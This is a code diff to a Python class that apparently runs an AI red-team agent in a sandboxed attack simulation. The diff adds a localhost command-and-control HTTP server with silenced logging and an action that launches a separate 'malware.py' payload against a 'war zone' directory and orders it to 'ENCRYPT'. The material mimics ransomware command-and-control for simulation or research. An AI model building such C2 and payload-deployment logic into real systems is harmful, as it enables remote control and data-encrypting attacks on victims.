@@ -13,11 +13,35 @@ import signal
 import sys
 import utils
 import config
+import threading
+import subprocess
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from typing import List, Tuple, Dict, Any
 
 # --- VISUALS ---
 C_RED = "\033[91m"
 C_RESET = "\033[0m"
+
+class C2Handler(BaseHTTPRequestHandler):
+    current_command = "SLEEP"
+
+    def do_GET(self):
+        if self.path == "/command":
+            self.send_response(200)
+            self.end_headers()
+            self.wfile.write(C2Handler.current_command.encode())
+        elif "/beacon" in self.path:
+            self.send_response(200)
+            self.end_headers()
+        elif "/log" in self.path:
+            self.send_response(200)
+            self.end_headers()
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+    def log_message(self, format, *args):
+        pass # Silence logging
 
 class RedTeamer:
     """
@@ -28,22 +52,22 @@ class RedTeamer:
         self.running: bool = True
         self.epsilon: float = config.AI_PARAMS['EPSILON_START']
         self.alpha: float = config.AI_PARAMS['ALPHA']
-        # Double Q-Learning: Two tables
         self.q_table_1: Dict[str, float] = {}
         self.q_table_2: Dict[str, float] = {}
-        self.memory: List[Tuple[str, str, float, str]] = [] # Experience Replay Buffer
+        self.memory: List[Tuple[str, str, float, str]] = []
         self.audit_logger = utils.AuditLogger(config.AUDIT_LOG)
 
-        # Signal Handling
+        self.c2_port = random.randint(8000, 9000)
+        self.c2_server = None
+        self.active_payloads = []
+
         signal.signal(signal.SIGINT, self.shutdown)
         signal.signal(signal.SIGTERM, self.shutdown)
 
         self.setup()
 
     def setup(self) -> None:
-        """Initialize resources and load persistent state."""
         print(f"{C_RED}[SYSTEM] Red Team AI Initialized. APT Framework: ACTIVE{C_RESET}")
-        # Load Q-Table (legacy single file split into two or init new)
         data = utils.access_memory(config.Q_TABLE_RED) or {}
         self.q_table_1 = data.get('q1', {})
         self.q_table_2 = data.get('q2', {})
@@ -52,10 +76,27 @@ class RedTeamer:
             try: os.makedirs(config.WAR_ZONE_DIR)
             except OSError: pass
 
+        # Start C2
+        self.start_c2()
+
+    def start_c2(self):
+        try:
+            self.c2_server = HTTPServer(('127.0.0.1', self.c2_port), C2Handler)
+            thread = threading.Thread(target=self.c2_server.serve_forever)
+            thread.daemon = True
+            thread.start()
+            print(f"{C_RED}[RED] C2 Server listening on port {self.c2_port}{C_RESET}")
+        except Exception as e:
+            print(f"C2 Start Error: {e}")
+
     def shutdown(self, signum: int, frame: Any) -> None:
-        """Graceful shutdown handler."""
         print(f"\n{C_RED}[SYSTEM] Red Team shutting down gracefully...{C_RESET}")
-        # Save both tables
+        if self.c2_server: self.c2_server.shutdown()
+        # Kill payloads
+        for p in self.active_payloads:
+            try: p.terminate()
+            except: pass
+
         utils.access_memory(config.Q_TABLE_RED, {'q1': self.q_table_1, 'q2': self.q_table_2})
         self.running = False
         sys.exit(0)
@@ -152,13 +193,21 @@ class RedTeamer:
                     except OSError: pass
 
                 elif action == "T1071_C2_BEACON":
-                    fname = os.path.join(config.WAR_ZONE_DIR, f"beacon_{int(time.time())}.c2_beacon")
+                    # Deploy Active Payload
                     try:
-                        payload = f"BEACON_ID:{random.randint(1000,9999)}"
-                        utils.secure_create(fname, payload)
-                        impact = 4
-                        self.audit_logger.log_event("RED", "C2_BEACON", f"Established beacon at {fname}")
-                    except OSError: pass
+                        payload_path = os.path.join(config.BASE_DIR, "payloads", "malware.py")
+                        if os.path.exists(payload_path):
+                            proc = subprocess.Popen(
+                                [sys.executable, payload_path, "--port", str(self.c2_port), "--target", config.WAR_ZONE_DIR],
+                                stdout=subprocess.DEVNULL,
+                                stderr=subprocess.DEVNULL
+                            )
+                            self.active_payloads.append(proc)
+                            impact = 5
+                            C2Handler.current_command = "ENCRYPT" # Command the botnet
+                            self.audit_logger.log_event("RED", "C2_BEACON", f"Deployed Payload PID: {proc.pid}")
+                    except Exception as e:
+                        print(e)
 
                 elif action == "T1589_LURK":
                     impact = 0
